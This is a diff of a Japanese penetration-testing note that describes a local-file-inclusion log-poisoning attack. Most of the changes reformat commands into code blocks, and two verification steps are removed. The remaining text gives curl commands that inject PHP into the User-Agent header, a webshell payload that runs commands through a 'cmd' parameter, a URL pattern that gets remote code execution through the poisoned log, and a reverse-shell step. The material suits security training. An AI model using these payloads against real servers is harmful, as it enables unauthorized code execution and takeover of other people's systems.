@@ -39,28 +39,27 @@ LFIを使ってサーバーのログファイルを画面に表示する
 
 
 
-#### 自分のリクエストがログに記録され、それがブラウザに表示されるかを確認
-
-`curl http://TARGET/Testing12345`
-
-#### ログを再度読み込みLFIでログを表示し、Testing12345 という文字が含まれているか確認
-ブラウザの検索機能（Ctrl+F）で見つける
-
 #### PHPコードのサニタイズを確認
 
-`curl http://TARGET -A "<?php system('id'); ?>"`
+```
+curl http://TARGET -A "<?php system('id'); ?>"
+```
 
 
 
 #### ポイズニング
 
-`curl http://$IP -A "<?php system(\$_GET['cmd']); ?>"`
+```
+curl http://$IP -A "<?php system(\$_GET['cmd']); ?>"
+```
 
 #### RCEの実行
 
 LFIを介してポイズニングされたログファイルにアクセスし、cmdパラメータを通じてコマンドを渡す。
 
-`http://TARGET/?PARAMETER=[LOG_PATH]&cmd=[リバースシェルコマンド]`
+```
+http://TARGET/?PARAMETER=[LOG_PATH]&cmd=[リバースシェルコマンド]
+```
 
 #### リバースシェル
     接続の確立：リバースシェルコマンドを送信し、ターゲットへのインタラクティブなアクセスを取得する。
